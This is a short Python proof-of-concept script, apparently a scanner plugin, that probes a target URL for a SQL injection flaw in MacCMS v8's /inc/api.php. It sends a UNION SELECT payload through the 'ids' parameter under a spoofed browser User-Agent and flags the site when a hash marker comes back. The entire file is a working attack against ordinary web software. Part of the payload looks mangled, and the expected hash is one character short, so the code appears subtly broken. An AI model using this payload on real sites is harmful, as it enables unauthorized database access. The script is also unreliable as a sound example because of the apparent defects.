#!/usr/bin/python
# -*- coding:utf-8
import re,sys
sys.path.append('..')
from expFunc import *

url=sys.argv[1]
payload ="/inc/api.php?ac=videolist&t=0&pg=0&ids=1%29%20Union%20sElect/**/md5(602589),NULL,* 48NULL%23"
bug ="243d353b44e167073a40f8bf33a02ad"
info ="%s/inc/api.php?ac=videolist&t=0&pg=0&ids=1 存在MacCMS v8 /inc/api.php SQL注入漏洞"

def main():
    res = HttpGet(url+payload,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
    if res[0].find(bug)!= -1:
        print(Result+url+info);


main()
